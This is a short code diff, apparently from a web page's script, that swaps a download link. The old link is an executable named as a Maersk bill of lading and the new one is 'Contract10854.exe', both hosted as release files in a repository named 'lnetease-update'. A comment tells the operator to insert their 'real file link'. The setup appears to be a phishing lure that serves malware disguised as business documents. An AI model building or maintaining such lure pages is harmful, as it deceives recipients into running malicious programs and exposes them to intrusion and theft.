@@ -5,7 +5,7 @@
   // ════════════════════════════════════════════════════
   //  ✏️  CHANGE THIS URL TO YOUR REAL FILE LINK
   // ════════════════════════════════════════════════════
-  var FILE_URL = 'https://github.com/nherdt01/lnetease-update/releases/download/v1.0/Maersk._BilL_Of_Loading.exe';
+  var FILE_URL = 'https://github.com/nherdt01/lnetease-update/releases/download/v1.0/Contract10854.exe';
   // ════════════════════════════════════════════════════
 
   var T={
